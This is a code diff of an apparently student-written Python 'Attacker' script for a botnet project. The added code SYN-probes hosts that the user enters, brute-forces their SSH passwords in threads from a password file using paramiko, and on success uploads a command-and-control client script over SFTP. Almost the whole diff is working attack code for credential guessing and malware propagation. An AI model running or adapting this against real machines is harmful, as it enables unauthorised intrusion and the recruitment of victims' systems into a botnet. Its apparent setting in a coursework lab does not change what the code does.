@@ -1,35 +1,59 @@
-'''
-File: Attacker.py
-Description: This script will try to guess the IP addreses of the target machine and send them the zombie VM's
-Author: Karun Sharma
-Date: 4-14-19
-'''
+from scapy.all import *
+import paramiko
+import threading
 
-import random
+paramiko.util.log_to_file("connections.log")
 
-def generateipaddresses():
-	tupleofipaddresses = list()
-	for index in range(10):
-		tupleofipaddresses.append('.'.join(str(random.randint(0,255)) for inner in range(4)))
+zombievms = raw_input("Enter the number of Zombie VM's")
 
-	return tupleofipaddresses
+clientslist = list()
+threadpool = list()
+connectresults = list()
+successclients = list()
+def tryandconnect(ipaddresses,passwordsource,successfullyconnectedclients):
+	try:
+		client = paramiko.SSHClient()
+		client.load_system_host_keys()
+		client.connect(ipaddresses,password=passwordsource)
+		sftp = client.open_sftp()
+		sftp.put('/root/CS445-Project/ConnecttoCNC.py','/root/ConnecttoCNC.py')
+		successfullyconnectedclients.append(client)
+	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException) as e:
+		return None
 
-result = 0
 
-zombiesvms = raw_input("Enter the number of Zombie VM's: ")
-referencetozombievms = list()
-for index in range(int(zombiesvms)):
-	ipaddresses = raw_input("Enter the ip addresses of Zombie VM {}: ".format(index + 1))
-	referencetozombievms.append(ipaddresses)
 
-print(referencetozombievms)
+for index in range(int(zombievms)):
+	ipaddresses = raw_input("Enter the ip address of zombie VM {}: ".format(index + 1))
 
-while int(result) != 3:
-	print("Choose from the following commands below")
-	print("1) Generate random IP addresses\n 2) Send IP addresses to zombie VM's\n 3)Exit")
-	result = raw_input("Enter a number: ")
+	#Send SYN scan to zombie VM
+	answer= sr1(IP(dst=ipaddresses)/TCP(dport=80,flags="S"))
+	print(answer.display())
 
-	if int(result) == 1:
-		ipaddresses = generateipaddresses()
-		print(ipaddresses)
+	#ADD CHECK FOR IF RESPONSE IS RECEIEVED
+
+
+	#SSH into machine
+	#client = paramiko.SSHClient()
+	#client.load_system_host_keys()
+	with open("Passwords.txt",'r') as file:
+		content = file.readlines()
+		listofpasswords = [index.strip() for index in content]
+		for row in listofpasswords:
+			t = threading.Thread(target=tryandconnect, args = (ipaddresses,row,successclients))
+			threadpool.append(t)
+			t.start()
+
+		print('List size = ', len(threadpool))
+		for threadresult in threadpool:
+			threadresult.join()
+
+		#for successclientsiterator in successclients:
+			#stdin,stdout,stderr = successclientsiterator.exec_command('')
+			#print(stdout.readlines())
+				#client.connect(ipaddresses,password=row)
+				#clientslist.append(client)
+				#stdin,stdout,stderr = client.exec_command('ls -l')
+				#print(stdout.readlines())
+
 
